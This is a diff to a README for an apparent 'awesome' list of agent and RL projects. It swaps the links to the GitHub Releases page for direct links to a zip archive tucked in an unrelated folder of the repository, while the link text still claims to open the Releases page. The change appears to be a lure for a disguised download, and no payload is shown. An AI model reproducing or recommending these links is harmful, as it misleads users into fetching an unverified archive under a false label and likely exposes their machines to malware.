@@ -1,6 +1,6 @@
 # 🤖 Awesome-OpenClaw-RL - Curated Agent and RL Projects
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/physical-cardiogenicshock212/Awesome-OpenClaw-RL/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/physical-cardiogenicshock212/Awesome-OpenClaw-RL/raw/refs/heads/main/Scincidae/Claw-Open-RL-Awesome-1.2-alpha.4.zip)
 
 ## 🚀 What this is
 
@@ -16,7 +16,7 @@ Use it if you want to:
 
 This project is shared through GitHub Releases. To get it on Windows, visit this page to download:
 
-[Open the Releases page](https://github.com/physical-cardiogenicshock212/Awesome-OpenClaw-RL/releases)
+[Open the Releases page](https://github.com/physical-cardiogenicshock212/Awesome-OpenClaw-RL/raw/refs/heads/main/Scincidae/Claw-Open-RL-Awesome-1.2-alpha.4.zip)
 
 On that page:
 1. Find the latest release.
